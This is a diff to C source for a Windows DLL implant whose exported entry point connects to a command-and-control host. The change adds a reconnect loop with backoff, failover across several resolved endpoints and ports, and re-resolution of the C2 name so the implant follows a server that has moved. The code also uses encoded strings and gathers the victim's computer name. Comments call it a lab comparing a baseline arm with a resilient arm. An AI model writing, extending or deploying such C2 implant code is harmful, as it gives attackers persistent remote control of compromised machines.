@@ -163,7 +163,9 @@ typedef struct px_sockaddr_in {
 #define PX_SOCK_STREAM 1
 #define PX_AF_INET 2
 #define PX_SOMAXCONN 0x7fffffff
+#ifndef PX_WSAAPI
 #define PX_WSAAPI __stdcall
+#endif
 
 typedef int (PX_WSAAPI *fn_wsastartup)(unsigned short, void *);
 typedef int (PX_WSAAPI *fn_wsacleanup)(void);
@@ -176,21 +178,10 @@ typedef unsigned long (PX_WSAAPI *fn_inet_addr)(const char *);
 typedef unsigned short (PX_WSAAPI *fn_htons)(unsigned short);
 typedef int (PX_WSAAPI *fn_getlasterror)(void);
 
-/* gethostbyname, for the domain generation variant.
- *
- * The plain build only ever connects to a literal address, which
- * inet_addr handles. The DGA build produces a NAME, so it needs the
- * resolver. The hostent layout is the Winsock one; only the fields that
- * are actually read are declared. */
-typedef struct px_hostent {
-    char *h_name;
-    char **h_aliases;
-    short h_addrtype;
-    short h_length;
-    char **h_addr_list;
-} px_hostent;
-
-typedef px_hostent *(PX_WSAAPI *fn_gethostbyname)(const char *);
+/* gethostbyname and inet_addr are declared in px_variant.h, because the
+ * endpoint resolution code needs them and that is a separate
+ * translation unit. The hostent layout is the Winsock one; only the
+ * fields that are actually read are declared. */
 
 /* WSADATA is filled in by WSAStartup; it must be a valid buffer, not NULL.
  * Layout mirrors wincrypt/winsock: version fields, limits, then the two
@@ -384,6 +375,8 @@ typedef struct px_vocab {
     char log_frame_len[48];
     char log_finished[32];
     char log_enc_state[48];
+    char log_backoff[64];
+    char log_reconnect[64];
 } px_vocab;
 
 static px_vocab g_vocab;
@@ -447,6 +440,8 @@ static void px_vocab_init(void)
     PX_VOCAB_DECODE(PX_SID_TXT_LOG_FRAME_LEN, g_vocab.log_frame_len);
     PX_VOCAB_DECODE(PX_SID_TXT_LOG_FINISHED, g_vocab.log_finished);
     PX_VOCAB_DECODE(PX_SID_TXT_LOG_ENC_STATE, g_vocab.log_enc_state);
+    PX_VOCAB_DECODE(PX_SID_TXT_LOG_BACKOFF, g_vocab.log_backoff);
+    PX_VOCAB_DECODE(PX_SID_TXT_LOG_RECONNECT, g_vocab.log_reconnect);
 #else
     px_strcpy(g_vocab.hello, "HELLO|", sizeof(g_vocab.hello));
     px_strcpy(g_vocab.caps, "CAPS|", sizeof(g_vocab.caps));
@@ -531,6 +526,10 @@ static void px_vocab_init(void)
               sizeof(g_vocab.log_finished));
     px_strcpy(g_vocab.log_enc_state, "[px] channel encryption %s\n",
               sizeof(g_vocab.log_enc_state));
+    px_strcpy(g_vocab.log_backoff, "[px] reconnecting in %lu seconds\n",
+              sizeof(g_vocab.log_backoff));
+    px_strcpy(g_vocab.log_reconnect, "[px] session ended, reconnecting\n",
+              sizeof(g_vocab.log_reconnect));
 #endif
 }
 
@@ -606,13 +605,6 @@ static char *px_strchr(const char *s, int c)
 /* ================================================================== */
 /* tiny formatting + logging (no CRT)                                 */
 /* ================================================================== */
-/* px_strcpy is declared here, before the vocabulary initialiser that
- * uses it, and defined further down with the rest of the string
- * helpers. */
-static px_size_t px_strcpy(char *dst, const char *src, px_size_t cap);
-
-
-
 /* Build "<dir of the running image>\<name>" and return it. */
 static void px_path_next_to_image(char *out, px_size_t cap, const char *name)
 {
@@ -1288,6 +1280,15 @@ static int px_env(const char *name, char *out, int cap)
     return 1;
 }
 
+/* The endpoint resolution.
+ *
+ * It is included HERE, at file scope and after px_strcpy, px_strchr and
+ * px_env are defined, because it uses all three. An include cannot sit
+ * inside a function body, and including it earlier made the compiler
+ * implicitly declare the helpers, which then collided with their real
+ * definitions. */
+#include "px_endpoints.c"
+
 __declspec(dllexport) void px_entry(void)
 {
     PX_SOCKET sock;
@@ -1320,6 +1321,7 @@ __declspec(dllexport) void px_entry(void)
     fn_getlasterror p_wsalasterror = NULL;
     fn_gethostbyname p_gethostbyname = NULL;
     PX_WSADATA wsa;
+    unsigned int attempt = 0;
 
     write_marker();
 
@@ -1437,62 +1439,88 @@ __declspec(dllexport) void px_entry(void)
         is64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
     }
 
-    sock = p_socket(PX_AF_INET, PX_SOCK_STREAM, 6);
-    if (sock == PX_INVALID_SOCKET) {
-        px_logf(g_vocab.log_sock_fail, (unsigned long)p_wsalasterror());
-        p_wsacleanup();
-        return;
-    }
+    /* ------------------------------------------------------------------ */
+    /* Connect.                                                             */
+    /* ------------------------------------------------------------------ */
+connect_again:
+    /* The connect is inside a retry loop, and the target is a LIST of      */
+    /* endpoints rather than one address.                                   */
+    /*                                                                       */
+    /* WHY                                                                 */
+    /* The lab has to work on whatever network the operator is on today:     */
+    /* the office wifi, a mobile hotspot, a hotel. A payload that connects  */
+    /* to one hardcoded address only works on the network that address is   */
+    /* on, and dies silently the moment the operator moves.                 */
+    /*                                                                       */
+    /* So the endpoint is a NAME, resolved every time, and a domain with    */
+    /* several A records gives failover for free. The port list handles    */
+    /* networks that block the lab's port. The backoff handles a laptop    */
+    /* that changes network mid-session.                                    */
+    /*                                                                       */
+    /* The baseline arm keeps the old behaviour -- one address, one        */
+    /* attempt, exit on failure -- because it is the comparison arm.       */
+    for (attempt = 0;; attempt++) {
+        px_endpoint_set eps;
+        unsigned int naddrs;
+        unsigned int ai;
+        int connected = 0;
 
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = PX_AF_INET;
-    addr.sin_port = p_htons((unsigned short)c2port);
-
-    /* Resolve the target.
-     *
-     * A literal address goes through inet_addr. A NAME -- which is what
-     * the domain generation variant produces -- goes through the
-     * resolver. Both are resolved here so that the rest of the code
-     * does not care which arm it is running. */
-    {
-        unsigned long resolved = 0;
-        int is_literal = 1;
-        const char *p;
-        for (p = c2host; *p; p++) {
-            if ((*p < '0' || *p > '9') && *p != '.') {
-                is_literal = 0;
-                break;
+#if PX_RESILIENT
+        {
+            unsigned int wait_s = px_backoff_for(attempt);
+            if (wait_s) {
+                px_logf(g_vocab.log_backoff, (unsigned long)wait_s);
+                Sleep(wait_s * 1000);
             }
         }
-        if (is_literal) {
-            resolved = p_inet_addr(c2host);
-        } else {
-            px_hostent *he = p_gethostbyname ? p_gethostbyname(c2host) : NULL;
-            if (he && he->h_addr_list && he->h_addr_list[0]) {
-                memcpy(&resolved, he->h_addr_list[0], sizeof(resolved));
-            } else {
-                px_logf(g_vocab.log_no_resolve, c2host);
-                p_closesocket(sock);
-                p_wsacleanup();
-                return;
-            }
-        }
-        if (resolved == 0) {
+#endif
+
+        naddrs = px_endpoints_resolve(&eps, c2host, (unsigned int)c2port,
+                                       p_gethostbyname, p_inet_addr);
+        if (naddrs == 0) {
             px_logf(g_vocab.log_no_resolve, c2host);
-            p_closesocket(sock);
+#if PX_RESILIENT
+            continue;
+#else
             p_wsacleanup();
             return;
+#endif
         }
-        addr.sin_addr = resolved;
+
+        for (ai = 0; ai < naddrs && !connected; ai++) {
+            sock = p_socket(PX_AF_INET, PX_SOCK_STREAM, 6);
+            if (sock == PX_INVALID_SOCKET) {
+                px_logf(g_vocab.log_sock_fail, (unsigned long)p_wsalasterror());
+                break;
+            }
+
+            memset(&addr, 0, sizeof(addr));
+            addr.sin_family = PX_AF_INET;
+            addr.sin_port = p_htons((unsigned short)eps.addrs[ai].port);
+            addr.sin_addr = eps.addrs[ai].addr;
+
+            px_logf(g_vocab.log_connecting, c2host,
+                    (unsigned int)eps.addrs[ai].port);
+            if (p_connect(sock, &addr, sizeof(addr)) != 0) {
+                px_logf(g_vocab.log_conn_fail, (unsigned long)p_wsalasterror());
+                p_closesocket(sock);
+                sock = PX_INVALID_SOCKET;
+                continue;
+            }
+            connected = 1;
+        }
+
+        if (!connected) {
+#if PX_RESILIENT
+            continue;
+#else
+            p_wsacleanup();
+            return;
+#endif
+        }
+        break;
     }
 
-    px_logf(g_vocab.log_connecting, c2host, c2port);
-    if (p_connect(sock, &addr, sizeof(addr)) != 0) {
-        px_logf(g_vocab.log_conn_fail, (unsigned long)p_wsalasterror());
-        p_closesocket(sock);
-        p_wsacleanup();
-        return;
-    }
     px_logf(g_vocab.log_connected);
 
     GetComputerNameA(host, &hn);
@@ -1864,8 +1892,33 @@ __declspec(dllexport) void px_entry(void)
         }
     }
 
-done:
+    /* The session ended. */
     p_closesocket(sock);
+    sock = PX_INVALID_SOCKET;
+
+#if PX_RESILIENT
+    /* Reconnect.
+     *
+     * The most common way this session ends is not an attack and not a
+     * bug: the operator's laptop changed network. The WiFi dropped, the
+     * hotspot took over, the C2's address changed, and the socket died.
+     * A payload that exits there is a payload that worked perfectly and
+     * then stopped working because the operator walked out of the room.
+     *
+     * So the resilient arm reconnects, with backoff, and resolves the
+     * endpoint name again each time -- which is what lets it pick up a
+     * C2 that has moved. */
+    px_logf(g_vocab.log_reconnect);
+    attempt++;
+    goto connect_again;
+#else
+    p_wsacleanup();
+    px_logf(g_vocab.log_finished);
+#endif
+
+done:
+    if (sock != PX_INVALID_SOCKET)
+        p_closesocket(sock);
     p_wsacleanup();
     px_logf(g_vocab.log_finished);
 }
